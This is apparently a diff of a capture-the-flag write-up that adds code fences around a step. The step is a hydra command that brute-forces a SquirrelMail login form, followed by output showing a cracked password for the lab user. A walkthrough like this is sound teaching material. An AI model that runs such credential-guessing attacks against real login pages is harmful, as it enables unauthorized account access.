@@ -234,7 +234,7 @@ User name field variable : login_username
 Password field variable : secretkey
 Failed attempt sign found in title '<title>SquirrelMail - Unknown user or password incorrect.</title>'
 http-post-form format : <path>:<POST data>:<failure string>
-
+```
 # hydra -l milesdyson -P log1.txt THM_Target http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect"
 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
@@ -244,7 +244,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-10 07:52:
 [80][http-post-form] host: THM_Target   login: milesdyson   password: cyborg007haloterminator
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-10 07:52:57
-
+```
 
 ## Q2 What is the hidden directory?
 
